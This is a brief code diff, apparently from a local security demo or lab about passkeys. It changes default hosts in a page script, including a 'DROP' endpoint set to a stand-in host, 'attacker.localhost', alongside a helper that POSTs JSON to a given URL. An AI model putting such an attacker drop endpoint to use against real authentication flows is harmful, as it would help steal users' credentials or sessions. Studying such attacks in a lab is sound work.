@@ -62,9 +62,9 @@
 <script type="module">
 import { PasskeyProvider } from '/passkey-provider.js';
 const q = new URLSearchParams(location.search);
-const provider = new PasskeyProvider({ authOrigin: q.get('auth') || 'http://localhost:1525' });
+const provider = new PasskeyProvider({ authOrigin: q.get('auth') || 'http://authenticator.localhost:1525' });
 const $ = (id) => document.getElementById(id);
-const DROP = q.get('drop') || 'http://127.0.0.1:1523';
+const DROP = q.get('drop') || 'http://attacker.localhost:1523';
 const post = (u, body) => fetch(u, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body||{}) });
 
 $('enroll').onclick = async () => {
